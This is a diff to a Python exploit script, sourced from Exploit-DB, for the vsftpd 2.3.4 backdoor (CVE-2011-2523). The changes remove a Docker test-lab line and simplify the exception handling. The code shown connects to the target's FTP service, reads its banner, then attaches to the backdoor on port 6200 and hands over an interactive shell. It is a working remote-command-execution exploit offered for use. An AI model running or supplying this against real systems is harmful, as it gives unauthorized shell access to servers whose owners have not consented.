@@ -1,7 +1,6 @@
 # Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
 # Source: https://www.exploit-db.com/exploits/49757
 # CVE: CVE-2011-2523
-# POC: sudo docker run -it --rm -p 21:21 -p 6200:6200 uexpl0it/vulnerable-packages:backdoored-vsftpd-2.3.4
 
 #!/usr/bin/python3
 
@@ -22,7 +21,7 @@ print(
     f"\n\tvsftpd 2.3.4 | Backdoor Command Execution\n\nLogin: {ip}:{port}")
 try:
     ftp = remote(ip, port, timeout=3)
-except PwnlibException as err:
+except PwnlibException:
     exit()
 ftp.recvuntil
 print("\tBanner:", ftp.recv(1024).decode().strip())
@@ -34,7 +33,7 @@ ftp.close()
 
 try:
     rce = remote(ip, 6200, timeout=3)
-except PwnlibException as err:
+except PwnlibException:
     exit()
 print(f"\tBackdoor Connected: {ip}:6200")
 rce.interactive()
